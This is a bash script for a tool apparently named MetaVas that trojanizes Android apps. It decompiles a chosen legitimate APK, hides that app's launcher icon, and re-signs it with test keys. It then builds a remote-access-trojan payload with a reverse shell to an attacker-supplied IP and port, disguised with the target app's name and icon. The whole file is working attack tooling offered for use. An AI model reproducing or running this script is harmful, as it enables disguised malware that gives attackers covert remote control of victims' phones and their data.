# Copyright (c) 2026 Sameer Al Sahab
# SPDX-License-Identifier: GPL-3.0-or-later

SRC_DIR=$PWD
TOOLS_DIR="$PWD/tools"

source "$SRC_DIR/scripts/log_utils.sh"

PRINT_USAGE() {
LOG "Usage: $0 -i <ip> -p <port> -t <target_apk>"
    LOG  "Options:"
    LOG --indent 2 "-i, --ip    IP address"
    LOG --indent 2 "-p, --port  Port number"
    LOG --indent 2 "-t, --target  The legitimate APK to clone"
    exit 1
}


CLEANUP() {
    [[ -d "$TMP_DIR" ]] && rm -rf "$TMP_DIR"
    LOG "Workspace cleaned."
}
trap CLEANUP EXIT

while getopts "i:p:t:" opt; do
    case $opt in
        i) IP="$OPTARG" ;;
        p) PORT="$OPTARG" ;;
        t) TARGET_APK="$OPTARG" ;;
        *) PRINT_USAGE ;;
    esac
done

[[ -z "$IP" || -z "$PORT" || -z "$TARGET_APK" ]] && PRINT_USAGE

TMP_DIR=$(mktemp -d -p "$SRC_DIR")
OUT_DIR="$SRC_DIR/out"

rm -rf "OUT_DIR"
mkdir -p "$OUT_DIR"

# Make sure we have everything installed in our environment
. "$SRC_DIR/scripts/install_deps.sh"
CHECK_DEPS

LOG "- Decoding target APK: $TARGET_APK"
java -jar "$TOOLS_DIR/apktool/apktool.jar" d -j $(nproc) "$TARGET_APK" -o "$TMP_DIR/target" > /dev/null || LOGE "Failed to decode target apk!"


# I extract identity (Icon and Label) for the payload later

ICON_PATH=$(grep -oP 'android:icon="\K[^"]+' "$TMP_DIR/target/AndroidManifest.xml")
ICON_NAME=$(basename "$ICON_PATH")


LABEL=$(aapt2 dump badging "$TARGET_APK" \
| grep "application-label:" \
| head -n1 \
| cut -d"'" -f2)

PKG_NAME=$(grep -oP 'package="\K[^"]+' "$TMP_DIR/target/AndroidManifest.xml")


MAIN_ACTIVITY=$(grep -B 15 'android.intent.category.LAUNCHER' "$TMP_DIR/target/AndroidManifest.xml" \
  | grep -oP '<activity[^>]+android:name="\K[^"]+' \
  | head -1)

LOG "Extracted package: $PKG_NAME"

# Remove the Launcher category to hide the icon
LOG --indent 1 "- Stripping launcher icon from target..."
sed -i '/android.intent.category.LAUNCHER/d' "$TMP_DIR/target/AndroidManifest.xml"

LOG --indent 2 "- Building target APK..."
java -jar "$TOOLS_DIR/apktool/apktool.jar" b -j $(nproc) "$TMP_DIR/target" -o "$TMP_DIR/target_hidden_unsigned.apk" > /dev/null

# Now I will sign it with aosp testkeys
PEM="$TOOLS_DIR/signapk/keys/aosp_testkey.x509.pem"
PK8="$TOOLS_DIR/signapk/keys/aosp_testkey.pk8"

java -jar "$TOOLS_DIR/signapk/signapk.jar" "$PEM" "$PK8" "$TMP_DIR/target_hidden_unsigned.apk" "$OUT_DIR/${PKG_NAME}_hidden.apk" > /dev/null


## NOW , OUR PAYLOAD TIME!!!!!!!!!

LOG "- Preparing Payload..."
cp -r "$SRC_DIR/metavas/rat" "$TMP_DIR/payload"

# Inject IP and Port into Config
sed -i "s/IP_PLACEHOLDER/$IP/g" "$TMP_DIR/payload/smali/com/example/reverseshell2/config.smali"
sed -i "s/PORT_PLACEHOLDER/$PORT/g" "$TMP_DIR/payload/smali/com/example/reverseshell2/config.smali"

sed -i "s/PKG_PLACEHOLDER/$PKG_NAME/g" "$TMP_DIR/payload/smali/com/example/reverseshell2/MainActivity.smali"
sed -i "s/ACT_PLACEHOLDER/$MAIN_ACTIVITY/g" "$TMP_DIR/payload/smali/com/example/reverseshell2/MainActivity.smali"

LOG --indent 1 "- Cloning target app resources..."


cat <<EOF > "$TMP_DIR/payload/res/values/metavas.xml"
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="cloned_app_label">$LABEL</string>
</resources>
EOF


# Update Manifest to use my new string
sed -i "s|android:label=\"[^\"]*\"|android:label=\"@string/cloned_app_label\"|g" \
"$TMP_DIR/payload/AndroidManifest.xml"


TARGET_ICON_FILE=$(find "$TMP_DIR/target/res" -name "$ICON_NAME*" -type f -exec ls -S {} + | head -n 1)

if [[ -f "$TARGET_ICON_FILE" ]]; then
    cp "$TARGET_ICON_FILE" "$TMP_DIR/payload/res/drawable/metavas_icon.png"
    LOG "Successfully replaced payload icon with target icon."
else
    LOGE "Could not find target icon file, using default..."
fi

LOG --indent 2 "Building MetaVas..."

if ! java -jar "$TOOLS_DIR/apktool/apktool.jar" \
    b -j "$(nproc)" \
    "$TMP_DIR/payload" \
    -o "$TMP_DIR/payload_unsigned.apk" > /dev/null; then

    LOGE "Failed to build payload APK"
    exit 1
fi

if ! java -jar "$TOOLS_DIR/signapk/signapk.jar" \
    "$PEM" \
    "$PK8" \
    "$TMP_DIR/payload_unsigned.apk" \
    "$OUT_DIR/metavas_launcher.apk" > /dev/null; then

    LOGE "Failed to sign payload APK"
    exit 1
fi

LOGS "Build successful. Check out/ for both APKs"
